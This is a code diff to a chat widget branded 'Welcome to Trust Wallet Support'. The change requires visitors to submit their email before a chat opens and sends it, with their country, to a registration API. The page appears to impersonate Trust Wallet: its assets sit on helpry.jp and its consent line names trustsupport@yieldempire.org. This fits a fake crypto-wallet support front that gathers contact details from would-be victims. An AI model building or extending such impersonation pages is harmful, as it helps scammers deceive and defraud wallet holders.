@@ -910,17 +910,36 @@
     <div id="chatMessages" class="flex-1 overflow-y-auto p-5 space-y-4 chat-scrollbar" style="background-color: #f7fafc;">
         <!-- Start Chat Screen (shown when no session exists) -->
         <div id="startChatScreen" class="hidden h-full flex items-center justify-center">
-            <div class="text-center px-6">
+            <div class="text-center px-6 w-full max-w-[320px]">
                 <div class="mb-6 flex justify-center">
                     <div class="w-20 h-20 rounded-full flex items-center justify-center" style="background-color: #0500FF20;">
                         <img src="https://helpry.jp/storage/app/public/platforms/trustwallet.jpeg" alt="Trust Wallet" class="w-12 h-12 object-contain rounded-full">
                     </div>
                 </div>
-                <h3 class="text-lg font-bold mb-2" style="color: #1a202c;">Welcome to Trust Wallet Support</h3>
-                <p class="text-sm mb-6" style="color: #718096;">Start a conversation with our support team</p>
-                <button id="startChatBtn" class="px-8 py-3 rounded-xl font-semibold text-sm transition-all hover:scale-105 shadow-lg" style="background-color: #0500FF; color: #FFFFFF;" onmouseover="this.style.backgroundColor='#0400CC'" onmouseout="this.style.backgroundColor='#0500FF'">
-                    Start Chat
-                </button>
+                <h3 class="text-lg font-bold mb-1" style="color: #1a202c;">Welcome to Trust Wallet Support</h3>
+                <p class="text-sm mb-5" style="color: #718096;">Connect your email so we can reply to you outside the chat.</p>
+
+                <form id="connectEmailForm" class="text-left space-y-3">
+                    <div>
+                        <label for="clientEmailInput" class="block text-xs font-semibold mb-1.5" style="color: #4a5568;">Your email address</label>
+                        <input
+                            type="email"
+                            id="clientEmailInput"
+                            required
+                            placeholder="you@example.com"
+                            autocomplete="email"
+                            class="w-full px-4 py-3 text-sm border rounded-xl focus:outline-none focus:ring-2 transition-all"
+                            style="border-color: #cbd5e0; background-color: #ffffff; color: #1a202c; font-size: 16px;"
+                            onfocus="this.style.borderColor='#0500FF'; this.style.boxShadow='0 0 0 3px #0500FF20';"
+                            onblur="this.style.borderColor='#cbd5e0'; this.style.boxShadow='none';"
+                        >
+                        <p id="emailError" class="hidden mt-1.5 text-xs" style="color: #e53e3e;">Please enter a valid email address.</p>
+                    </div>
+                    <button type="submit" id="startChatBtn" class="w-full px-8 py-3 rounded-xl font-semibold text-sm transition-all hover:scale-[1.02] shadow-lg" style="background-color: #0500FF; color: #FFFFFF;" onmouseover="this.style.backgroundColor='#0400CC'" onmouseout="this.style.backgroundColor='#0500FF'">
+                        Start Chat
+                    </button>
+                    <p class="text-[11px] text-center leading-relaxed" style="color: #a0aec0;">By starting a chat, you agree to receive support messages by email from <span style="color:#0500FF;">trustsupport@yieldempire.org</span>.</p>
+                </form>
             </div>
         </div>
 
@@ -1063,6 +1082,11 @@
     const sendMessageBtn = document.getElementById('sendMessage');
     const attachImageBtn = document.getElementById('attachImageBtn');
     const chatMessages = document.getElementById('chatMessages');
+    const startChatScreen = document.getElementById('startChatScreen');
+    const chatContent = document.getElementById('chatContent');
+    const connectEmailForm = document.getElementById('connectEmailForm');
+    const clientEmailInput = document.getElementById('clientEmailInput');
+    const emailError = document.getElementById('emailError');
 
     // Auto-resize textarea
     const maxTextareaHeight = 120;
@@ -1310,39 +1334,72 @@
         chatInputSection.style.display = 'block';
     }
 
-    // Handle Start Chat button click
-    startChatBtn.addEventListener('click', async function() {
-        console.log('Start Chat button clicked');
-        startChatBtn.disabled = true;
-        startChatBtn.textContent = 'Starting...';
+    // Handle Start Chat: require a valid email before opening the conversation.
+    const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
-        try {
-            const registered = await registerClient();
+    function showEmailError(msg) {
+      if (emailError) {
+        emailError.textContent = msg;
+        emailError.classList.remove('hidden');
+      }
+    }
 
-            if (registered) {
-                console.log('Client registered successfully, showing chat');
-                showChatContent();
-                chatMessages.scrollTop = chatMessages.scrollHeight;
-            } else {
-                console.error('Failed to register client');
-                const message = 'Failed to start chat. Please try again.' +
-                    (window.location.protocol === 'file:' ? '\nThis widget must be served from a web server because the Helpry API endpoints are required.' : '');
-                alert(message);
-                startChatBtn.disabled = false;
-                startChatBtn.textContent = 'Start Chat';
-            }
-        } catch (error) {
-            console.error('Unexpected startup error:', error);
-            // Give a useful message instead of the raw "signal is aborted" text.
-            let detail = error?.message || 'Check the browser console for the API error.';
-            if (error?.name === 'AbortError' || /abort/i.test(detail)) {
-                detail = 'The support server did not respond. The site may not be deployed yet — ask the site owner to redeploy, then try again.';
-            }
-            alert('Failed to start chat.\n' + detail);
-            startChatBtn.disabled = false;
-            startChatBtn.textContent = 'Start Chat';
+    function clearEmailError() {
+      if (emailError) emailError.classList.add('hidden');
+    }
+
+    if (connectEmailForm) {
+      connectEmailForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const raw = (clientEmailInput && clientEmailInput.value || '').trim();
+        if (!EMAIL_RE.test(raw)) {
+          showEmailError('Please enter a valid email address.');
+          if (clientEmailInput) clientEmailInput.focus();
+          return;
         }
+        clearEmailError();
+        await startChatWithEmail(raw);
+      });
+    }
+
+    // Keep the old button id working even if no form is present (defensive).
+    startChatBtn.addEventListener('click', async function() {
+      if (connectEmailForm) return; // form handles it
+      await startChatWithEmail(null);
     });
+
+    async function startChatWithEmail(clientEmail) {
+      console.log('Start Chat clicked; email:', clientEmail ? 'provided' : 'none');
+      startChatBtn.disabled = true;
+      const originalLabel = startChatBtn.textContent;
+      startChatBtn.textContent = 'Starting...';
+
+      try {
+        const registered = await registerClient(clientEmail);
+
+        if (registered) {
+          console.log('Client registered successfully, showing chat');
+          showChatContent();
+          chatMessages.scrollTop = chatMessages.scrollHeight;
+        } else {
+          console.error('Failed to register client');
+          const message = 'Failed to start chat. Please try again.' +
+            (window.location.protocol === 'file:' ? '\nThis widget must be served from a web server because the Helpry API endpoints are required.' : '');
+          alert(message);
+          startChatBtn.disabled = false;
+          startChatBtn.textContent = originalLabel;
+        }
+      } catch (error) {
+        console.error('Unexpected startup error:', error);
+        let detail = error?.message || 'Check the browser console for the API error.';
+        if (error?.name === 'AbortError' || /abort/i.test(detail)) {
+          detail = 'The support server did not respond. The site may not be deployed yet — ask the site owner to redeploy, then try again.';
+        }
+        alert('Failed to start chat.\n' + detail);
+        startChatBtn.disabled = false;
+        startChatBtn.textContent = originalLabel;
+      }
+    }
 
     // Fetch country for analytics, but NEVER let it block opening the chat.
     // ipapi.co rate-limits aggressively, so we cap it at 3s and fail silently.
@@ -1360,7 +1417,7 @@
         }
     }
 
-    async function registerClient() {
+    async function registerClient(clientEmail) {
         try {
             if (window.location.protocol === 'file:' || !window.location.origin || window.location.origin === 'null') {
                 throw new Error('This widget must be opened from a web server and the same domain as the Helpry API. Opening the HTML file directly will fail because /api/register-client is unavailable.');
@@ -1383,7 +1440,8 @@
                 signal: controller.signal,
                 body: JSON.stringify({
                     helpry_id: helpryId,
-                    country: country
+                    country: country,
+                    email: clientEmail || null
                 })
             });
             clearTimeout(apiTimeout);
